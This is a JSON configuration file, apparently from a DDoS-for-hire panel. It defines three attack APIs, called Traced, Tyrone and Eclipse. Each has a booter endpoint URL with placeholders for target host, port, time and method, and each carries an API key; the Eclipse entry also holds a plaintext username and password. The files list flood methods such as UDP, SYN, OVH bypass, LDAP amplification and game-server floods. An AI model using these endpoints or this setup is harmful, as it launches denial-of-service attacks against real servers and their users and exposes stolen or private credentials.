{
    "Traced API": {
        "api_toggle": "true",
        "api_url": "https://traced-stresser.xyz/api/api.php?key=5gvru5lij94qbpl&host=[HOST]&port=[PORT]&time=[TIME]&method=[METHOD]",
        "api_maxtime": "1200",
        "api_maxconn": "99",
        "api_methods": "HOME-TRC,UDP-TRC,MIXAMP-TRC,TCP-TRC,NFO-TRC,OVH-TRC,SSH-TRC,GAME-TPC,FIVEM-TRC,ARK-TRC,MC-TRC,HTTPS-TRC,TLS-TRC",
        "api_funnels": ""
    },
    "Tyrone API": {
        "api_toggle": "true",
        "api_url": "http://136.175.200.25:999/attack?key=kafnb897a9g2r&method=[METHOD]&time=[TIME]&port=[PORT]&host=[HOST]",
        "api_maxtime": "1200",
        "api_maxconn": "99",
        "api_methods": "DNS,UDP,TCP,SYN,ACK,KILLALL,OVH,HTTPS,STOP",
        "api_funnels": ""
    },
    "Eclipse API": {
	"api_toggle": "true",
	"api_url": "https://eclipsesec.xyz/client/api.php?key=1nfw805ccspg9jf&host=[HOST]&port=[PORT]&time=[TIME]&method=[METHOD]&username=Cupid&password=CupidV1!!53n!gj",
	"api_maxtime": "600",
	"api_maxconn": "3",
	"api_methods": "ECLIPSE-LDAP,ECLIPSE-NFO,ECLIPSE-NFOTCP,ECLIPSE-TCPBYPASS,ECLIPSE-OVH,ECLIPSE-OVHBETA,ECLIPSE-OVHMIX,ECLIPSE-GAME,ECLIPSE-UDPKILL,HTTP-GET",
	"api_funnels": ""
    }
}
